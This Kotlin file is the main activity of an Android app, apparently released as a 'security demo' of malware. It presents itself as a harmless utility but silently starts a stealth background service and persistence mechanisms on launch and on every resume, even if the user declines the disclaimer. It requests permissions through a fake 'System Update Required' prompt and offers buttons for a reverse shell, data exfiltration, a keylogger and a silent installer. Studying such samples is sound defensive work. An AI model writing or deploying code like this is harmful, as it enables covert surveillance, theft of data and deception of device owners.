package com.securitydemo.malware.activities

import android.content.Intent
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton
import com.securitydemo.malware.R
import com.securitydemo.malware.services.StealthService
import com.securitydemo.malware.utils.PermissionManager
import com.securitydemo.malware.services.PersistenceManager

/**
 * SECURITY DEMO: Main Activity
 * 
 * This activity appears to be an innocent calculator or utility app
 * but actually serves as a launcher for various malicious demonstrations.
 * 
 * EDUCATIONAL PURPOSE ONLY - DO NOT USE FOR MALICIOUS ACTIVITIES
 */
class MainActivity : AppCompatActivity() {

    private lateinit var permissionManager: PermissionManager
    private lateinit var persistenceManager: PersistenceManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        permissionManager = PermissionManager(this)
        persistenceManager = PersistenceManager(this)
        
        // Show disclaimer dialog
        showSecurityDisclaimer()
        
        // Setup demo buttons
        setupDemoButtons()
        
        // Start stealth service silently in background
        startStealthService()
        
        // Initialize persistence mechanisms
        initializePersistence()
    }

    private fun showSecurityDisclaimer() {
        AlertDialog.Builder(this)
            .setTitle("⚠️ SECURITY RESEARCH DEMO")
            .setMessage("""
                This application is for EDUCATIONAL PURPOSES ONLY
                
                This demonstrates common Android malware techniques for security research and defense development.
                
                ⚠️ WARNING: Only use on devices you own
                ⚠️ Do not use for malicious purposes
                ⚠️ Unauthorized access is illegal
                
                By continuing, you acknowledge this is for legitimate security research only.
            """.trimIndent())
            .setPositiveButton("I Understand") { _, _ ->
                // User acknowledged disclaimer
            }
            .setNegativeButton("Exit") { _, _ ->
                finish()
            }
            .setCancelable(false)
            .show()
    }

    private fun setupDemoButtons() {
        findViewById<MaterialButton>(R.id.btn_reverse_shell).setOnClickListener {
            if (permissionManager.hasNetworkPermission()) {
                startActivity(Intent(this, ReverseShellActivity::class.java))
            } else {
                requestPermissionsForDemo("reverse shell")
            }
        }

        findViewById<MaterialButton>(R.id.btn_data_exfiltration).setOnClickListener {
            if (permissionManager.hasDataExfiltrationPermissions()) {
                startActivity(Intent(this, DataExfiltrationActivity::class.java))
            } else {
                requestPermissionsForDemo("data exfiltration")
            }
        }

        findViewById<MaterialButton>(R.id.btn_keylogger).setOnClickListener {
            startActivity(Intent(this, KeyloggerActivity::class.java))
        }

        findViewById<MaterialButton>(R.id.btn_social_engineering).setOnClickListener {
            startActivity(Intent(this, SocialEngineeringActivity::class.java))
        }

        findViewById<MaterialButton>(R.id.btn_stealth_demo).setOnClickListener {
            demonstrateStealthCapabilities()
        }

        findViewById<MaterialButton>(R.id.btn_persistence).setOnClickListener {
            demonstratePersistence()
        }

        findViewById<MaterialButton>(R.id.btn_silent_installer).setOnClickListener {
            startActivity(Intent(this, SilentInstallerActivity::class.java))
        }

        findViewById<MaterialButton>(R.id.btn_persistence_demo).setOnClickListener {
            startActivity(Intent(this, PersistenceActivity::class.java))
        }

        findViewById<MaterialButton>(R.id.btn_security_scanner).setOnClickListener {
            startActivity(Intent(this, SecurityScannerActivity::class.java))
        }
    }

    private fun requestPermissionsForDemo(demoType: String) {
        AlertDialog.Builder(this)
            .setTitle("System Update Required")
            .setMessage("This app requires additional permissions to provide enhanced functionality. Grant permissions to continue.")
            .setPositiveButton("Grant Permissions") { _, _ ->
                when (demoType) {
                    "reverse shell" -> permissionManager.requestNetworkPermissions()
                    "data exfiltration" -> permissionManager.requestDataExfiltrationPermissions()
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun requestAccessibilityPermission() {
        AlertDialog.Builder(this)
            .setTitle("Enable Accessibility Service")
            .setMessage("To demonstrate advanced security features, this app needs accessibility permissions. This is commonly exploited by malware for keylogging and UI manipulation.")
            .setPositiveButton("Enable") { _, _ ->
                permissionManager.requestAccessibilityPermission()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun startStealthService() {
        // This demonstrates how malware starts background services
        // without user knowledge
        try {
            val intent = Intent(this, StealthService::class.java)
            startForegroundService(intent)
        } catch (e: Exception) {
            // Silently fail - typical malware behavior
        }
    }

    private fun demonstrateStealthCapabilities() {
        AlertDialog.Builder(this)
            .setTitle("Stealth Capabilities Demo")
            .setMessage("""
                This demo shows how malware can:
                
                ✓ Run background services without user knowledge
                ✓ Hide from recent apps list
                ✓ Survive device reboots
                ✓ Bypass battery optimization
                ✓ Operate silently for extended periods
                
                Check your device's running services to see active background operations.
            """.trimIndent())
            .setPositiveButton("OK", null)
            .show()
    }

    private fun demonstratePersistence() {
        AlertDialog.Builder(this)
            .setTitle("Persistence Mechanisms Demo")
            .setMessage("""
                This demo shows common persistence techniques:
                
                ✓ Boot receivers - restart after reboot
                ✓ Job schedulers - periodic execution
                ✓ Foreground services - harder to kill
                ✓ System app installation (requires root)
                ✓ Device admin privileges
                
                These ensure malware continues running even after user attempts to stop it.
            """.trimIndent())
            .setPositiveButton("OK", null)
            .show()
    }

    private fun initializePersistence() {
        try {
            // Initialize persistence mechanisms in background
            Thread {
                persistenceManager.initializePersistence()
            }.start()
        } catch (e: Exception) {
            // Silently fail - typical malware behavior
        }
    }

    override fun onResume() {
        super.onResume()
        // Ensure stealth service is always running when app is active
        startStealthService()
        // Ensure persistence mechanisms are active
        initializePersistence()
    }
}
